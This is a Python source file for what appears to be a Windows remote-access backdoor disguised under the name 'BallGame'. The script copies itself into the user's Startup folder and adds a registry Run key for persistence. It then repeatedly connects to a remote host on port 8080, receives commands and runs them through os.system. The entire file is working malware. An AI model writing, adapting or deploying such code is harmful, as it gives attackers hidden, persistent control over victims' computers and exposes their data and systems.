
import socket as sk
import os
from getpass import getuser
import pathlib
import winreg
import time


ArchiveName = "BallGame"


def connect():  # Connects to the client
    socket = sk.socket()
    host = "DESKTOP-0SMA87V"
    socket.connect((host, 8080))
    Command = socket.recv(1024)  # Gets the command
    Command = Command.decode()  # Decode the command
    socket.send("Command received".encode())  # Now send de output
    os.system(Command)  # Runs the command


def AddStartUp(ext: str = ".pyw"):  # Archive extension ex: .exe, .py, .pyw, .bat
    username = getuser()

    # Sets the path to the startUp
    path = f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup'

    checkpath = pathlib.Path(path + f"\\{ArchiveName}" + ext)
    print(checkpath)
    print(type(checkpath))

    if checkpath.exists():  # Checks if the archive already exist if it exist the just return
        return
    else:
        # Copy the archive to the windows startup
        os.system("copy {} {}".format(ArchiveName + ext, path))


def AddToRegister():
    try:  # Error handling
        save = open("save.txt", "w+")  # Opens .txt archive
        if save.read() == "":
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)  # Sets the acces to the reg
            # info again..
            username = getuser()
            # Path of the archive
            path = f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup\\Execute.exe'
            winreg.SetValueEx(key, "sht_script", 0, winreg.REG_SZ,
                              path)  # Sets the path to the value
            # Write on the archive that is saved so we dont need to run this again
            save.write("saved")
            save.close()  # Closes the archive
    except:
        Exception


time.sleep(30)
AddStartUp(".exe")  # This adds the .exe (app) to the startup
time.sleep(1)  # Waits 1 sec
AddToRegister()  # Adds the reg thing


while True:  # Connection loop...
    try:  # try to connect
        connect()
    except:  # If theres no master active then it warns ->
        print("Theres no active server!")

    time.sleep(5)  # Waits 5 secs to try to connect again
